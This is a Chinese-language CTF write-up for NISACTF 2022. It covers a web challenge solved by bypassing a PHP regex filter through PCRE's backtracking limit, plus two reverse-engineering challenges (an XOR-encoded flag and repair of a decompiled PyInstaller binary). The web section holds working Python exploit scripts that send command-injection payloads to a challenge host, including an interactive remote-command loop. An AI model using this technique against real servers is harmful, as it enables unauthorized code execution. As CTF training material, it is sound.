# [NISACTF 2022] 部分wp

## Web

### middlerce

那道题，这啥，正则过滤这么多

![image-20221107101415092](https://nssctf.wdf.ink/img/yxy/image-20221107101415092.png)

考点：**PCRE正则绕过** **RCE**

- PCRE有回溯限制，在贪婪匹配中回溯超过1000000次（默认）则会返回false

对此判断结构，第一个判断为false时执行else，可以通过最大回溯绕过正则

所以我们要把post的参数做的足够长长长长长长长长长长长长长长长长长长长长长

```json
POST参数：
{
    "cmd":执行的命令,
    "sc":垃圾数据，记得使用特殊符号
}
```

使用python来完成这项工作，毕竟谁愿意输入1000000次垃圾数据啊

```python
import requests
pcre = ")"*1000000
payload = "system('cat /flag');"
postdata = str(
    {
        "cmd":payload,
        "sc":pcre
    }
        ).replace("\'","\"")	#将dict对象str之后，引号默认为单引号，而json只认双引号

print(requests.post("http://1.14.71.254:28441/",data={"letter":postdata}).text)
```

哈哈，不知道什么被ban了，差一点点捏~

尝试使用短标签代替echo，不用system函数，采用反引号，重新构造payload：

```python
payload = '?><?= `ls`?>'
```

发现 check.php，打开看看，cat不行，试试nl

nl也不行，估计是php被ban了，尝试通配符

```python
payload = '?><?= `nl c*`?>'
```

![image-20221107105145018](https://nssctf.wdf.ink/img/yxy/image-20221107105145018.png)

ban了这么多，但这里不能用最大回溯绕过，因为没有地方填充垃圾数据，那就直接 `nl /*` 得到flag

整个花活儿（getshell（迫真））

```python
import requests
pcre = ")"*1000000
while 1:
    cmd = input("remote@www-data: ")
    payload = f'?><?= `{cmd}`?>'
    postdata = str(
        {
            "cmd":payload,
            "sc":pcre
        }
            ).replace("\'","\"")

    print(requests.post("http://1.14.71.254:28441/",data={"letter":postdata}).text)
```

![image-20221107105927757](https://nssctf.wdf.ink/img/yxy/image-20221107105927757.png)



## Reverse

### sign-ezc++

拿到exe，扔进IDA，发现是C++，哇，好混乱，看不懂

![image-20221107091915923](https://nssctf.wdf.ink/img/yxy/image-20221107091915923.png)

仔细分析一下，命名空间 **Human** 存在疑似flag的东西，追踪一下

考点：**C++逆向** **异或**

- 比C稍显混乱，需要抓住main函数主要逻辑，以及找到合适的命名空间进行追踪

直接追踪似乎不行，在旁边的 **Functions windows** 里直接搜索

![image-20221107092333236](https://nssctf.wdf.ink/img/yxy/image-20221107092333236.png)

哇，是flag，追踪一下

![image-20221107092353591](https://nssctf.wdf.ink/img/yxy/image-20221107092353591.png)

简单的异或运算，将原文与 **0xA** 进行异或运算，追踪flag变量

![image-20221107092459214](https://nssctf.wdf.ink/img/yxy/image-20221107092459214.png)

复制下来，写exp

```python
a = '44,59,59,49,5E,4C,71,7E,62,63,79,55,63,79,55,44,43,59,4B,55,78,6F,55,79,63,6D,64,77,14'
flag = ''
for x in a.split(","):
    flag += chr(int(f"0x{x}",16)^0XA)
print(flag)
```

- 注意：数字为 **16进制**

![image-20221107092937594](https://nssctf.wdf.ink/img/yxy/image-20221107092937594.png)



### ezpython

拿到一个exe，目测是pyintaller打包的，用 **pyinstxtractor.py** 解包，得到一个文件夹

![image-20221107093437291](https://nssctf.wdf.ink/img/yxy/image-20221107093437291.png)

考点：**Python逆向** **文件修复**

- 用pyinstxtractor.py出来的pyc不完整，需要用struct文件进行修复（3.8及以下可用）
- pyc再用 **uncompyle6** 进行逆向得到源码

![image-20221107093623644](https://nssctf.wdf.ink/img/yxy/image-20221107093623644.png)

使用010打开，将 **E3** 之前的struct粘贴到src的对应位置

![image-20221107093842902](https://nssctf.wdf.ink/img/yxy/image-20221107093842902.png)

![image-20221107093858144](https://nssctf.wdf.ink/img/yxy/image-20221107093858144.png)

保存即可得到原始的pyc文件（针对py3.8及以下的方案）

使用uncompyle6进行逆向pyc，记得先将后缀改为pyc，否侧出现不可言状的错误

![image-20221107094559335](https://nssctf.wdf.ink/img/yxy/image-20221107094559335.png)

得到源码，进行分析，看到一个flag，但是是假的，寄！

发现判断结构，需要输入的值与 `decrypt2('AAAAAAAAAAAfFwwRSAIWWQ==', key):` 相等

![image-20221107095256653](https://nssctf.wdf.ink/img/yxy/image-20221107095256653.png)

不想判断，直接改为true，运行得到flag

```python
# uncompyle6 version 3.8.0
# Python bytecode 3.4 (3310)
# Decompiled from: Python 3.8.7 (tags/v3.8.7:6503f05, Dec 21 2020, 17:59:51) [MSC v.1928 64 bit (AMD64)]
# Embedded file name: src.py
# Compiled at: 1995-09-28 00:18:56
# Size of source mod 2**32: 272 bytes
import rsa, base64
key1 = rsa.PrivateKey.load_pkcs1(base64.b64decode('LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcVFJQkFBS0NBUUVBcVJUZ0xQU3BuT0ZDQnJvNHR1K1FBWXFhTjI2Uk42TzY1bjBjUURGRy9vQ1NJSU00ClNBeEVWaytiZHpSN2FucVNtZ1l5MEhRWGhDZTM2U2VGZTF0ejlrd0taL3UzRUpvYzVBSzR1NXZ4UW5QOWY1cTYKYVFsbVAvVjJJTXB5NFFRNlBjbUVoNEtkNm81ZWRJUlB2SHd6V0dWS09OQ3BpL0taQ082V0tWYkpXcWh3WGpEQgpsSDFNVURzZ1gyVUM4b3Bodnk5dXIyek9kTlBocElJZHdIc1o5b0ZaWWtaMUx5Q0lRRXRZRmlKam1GUzJFQ1RVCkNvcU9acnQxaU5jNXVhZnFvZlB4eHlPb2wwYVVoVGhiaHE4cEpXL3FPSFdYd0xJbXdtNk96YXFVeks4NEYyY3UKYWRiRE5zeVNvaElHaHYzd0lBVThNSlFnOEthd1Z3ZHBzRWhlSXdJREFRQUJBb0lCQURBazdwUStjbEZtWHF1Vgp1UEoyRWxZdUJpMkVnVHNMbHZ0c1ltL3cyQnM5dHQ0bEh4QjgxYlNSNUYyMEJ2UlJ4STZ3OXlVZCtWZzdDd1lMCnA5bHhOL3JJdWluVHBkUEhYalNhaGNsOTVOdWNOWEZ4T0dVU05SZy9KNHk4dUt0VHpkV3NITjJORnJRa0o4Y2IKcWF5czNOM3RzWTJ0OUtrUndjbUJGUHNJalNNQzB5UkpQVEE4cmNqOFkranV3SHZjbUJPNHVFWXZXeXh0VHR2UQova0RQelBqdTBuakhkR055RytkSDdkeHVEV2Jxb3VZQnRMdzllZGxXdmIydTJ5YnZzTXl0NWZTOWF1a01NUjNoCnBhaDRMcU1LbC9ETTU3cE44Vms0ZTU3WE1zZUJLWm1hcEptcVNnSGdjajRPNWE2R1RvelN1TEVoTmVGY0l2Tm8KWFczTEFHRUNnWWtBc0J0WDNVcFQ3aUcveE5BZDdSWER2MENOY1k1QnNZOGY4NHQ3dGx0U2pjSWdBKy9nUjFMZQpzb2gxY1RRd1RadUYyRTJXL1hHU3orQmJDTVVySHNGWmh1bXV6aTBkbElNV3ZhU0dvSlV1OGpNODBlUjRiVTRyCmdYQnlLZVZqelkzNVlLejQ5TEVBcFRQcTZRYTVQbzhRYkF6czhuVjZtNXhOQkNPc0pQQ29zMGtCclFQaGo5M0cKOFFKNUFQWEpva0UrMmY3NXZlazZNMDdsaGlEUXR6LzRPYWRaZ1MvUVF0eWRLUmg2V3VEeGp3MytXeXc5ZjNUcAp5OXc0RmtLRzhqNVRpd1RzRmdzem94TGo5TmpSUWpqb3cyVFJGLzk3b2NxMGNwY1orMUtsZTI1cEJ3bk9yRDJBCkVpMUVkMGVEV3dJR2gzaFhGRmlRSzhTOG5remZkNGFMa1ZxK1V3S0JpRXRMSllIamFZY0N2dTd5M0JpbG1ZK0gKbGZIYkZKTkowaXRhazRZZi9XZkdlOUd6R1h6bEhYblBoZ2JrZlZKeEVBU3ZCOE5NYjZ5WkM5THdHY09JZnpLRApiczJQMUhuT29rWnF0WFNxMCt1UnBJdEkxNFJFUzYySDJnZTNuN2dlMzJSS0VCYnVKb3g3YWhBL1k2d3ZscUhiCjFPTEUvNnJRWk0xRVF6RjRBMmpENmdlREJVbHhWTUVDZVFDQjcyUmRoYktNL3M0TSsvMmYyZXI4Y2hwT01SV1oKaU5Hb3l6cHRrby9sSnRuZ1RSTkpYSXdxYVNCMldCcXpndHNSdEhGZnpaNlNyWlJCdTd5Y0FmS3dwSCtUd2tsNQpoS2hoSWFTNG1vaHhwUVNkL21td1JzbTN2NUNDdXEvaFNtNmNXYTdFOVZxc25heGQzV21tQ2VqTnp0MUxQWUZNCkxZMENnWWdKUHhpVTVraGs5cHB6TVAwdWU0clA0Z2YvTENldEdmQjlXMkIyQU03eW9VM2VsMWlCSEJqOEZ3UFQKQUhKUWtCeTNYZEh3SUpGTUV1RUZSSFFzcUFkSTlYVDBzL2V0QTg1Y3grQjhjUmt3bnFHakFseW1PdmJNOVNrMgptMnRwRi8rYm56ZVhNdFA3c0ZoR3NHOXJ5SEZ6UFNLY3NDSDhXWWx0Y1pTSlNDZHRTK21qblAwelArSjMKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K'))
key2 = rsa.PublicKey.load_pkcs1(base64.b64decode('LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFSVGdMUFNwbk9GQ0JybzR0dStRQVlxYU4yNlJONk82NW4wY1FERkcvb0NTSUlNNFNBeEUKVmsrYmR6UjdhbnFTbWdZeTBIUVhoQ2UzNlNlRmUxdHo5a3dLWi91M0VKb2M1QUs0dTV2eFFuUDlmNXE2YVFsbQpQL1YySU1weTRRUTZQY21FaDRLZDZvNWVkSVJQdkh3eldHVktPTkNwaS9LWkNPNldLVmJKV3Fod1hqREJsSDFNClVEc2dYMlVDOG9waHZ5OXVyMnpPZE5QaHBJSWR3SHNaOW9GWllrWjFMeUNJUUV0WUZpSmptRlMyRUNUVUNvcU8KWnJ0MWlOYzV1YWZxb2ZQeHh5T29sMGFVaFRoYmhxOHBKVy9xT0hXWHdMSW13bTZPemFxVXpLODRGMmN1YWRiRApOc3lTb2hJR2h2M3dJQVU4TUpRZzhLYXdWd2Rwc0VoZUl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K'))

def encrypt1(message):
    crypto_text = rsa.encrypt(message.encode(), key2)
    return crypto_text


def decrypt1(message):
    message_str = rsa.decrypt(message, key1).decode()
    return message_str


def encrypt2(tips, key):
    ltips = len(tips)
    lkey = len(key)
    secret = []
    num = 0
    for each in tips:
        if num >= lkey:
            num = num % lkey
        secret.append(chr(ord(each) ^ ord(key[num])))
        num += 1

    return base64.b64encode(''.join(secret).encode()).decode()


def decrypt2(secret, key):
    tips = base64.b64decode(secret.encode()).decode()
    ltips = len(tips)
    lkey = len(key)
    secret = []
    num = 0
    for each in tips:
        if num >= lkey:
            num = num % lkey
        secret.append(chr(ord(each) ^ ord(key[num])))
        num += 1

    return ''.join(secret)


flag = 'IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0='
key = 'this is key'
try:
    result = input('please input key: ')
    if True:
        print(decrypt1(base64.b64decode(decrypt2(flag, result))))
    else:
        if result == key:
            print('flag{0e26d898-b454-43de-9c87-eb3d122186bc}')
        else:
            print('key is error.')
except Exception as e:
    pass

```

![image-20221107095532853](https://nssctf.wdf.ink/img/yxy/image-20221107095532853.png)

- Tips：需要提前安装 `rsa` 库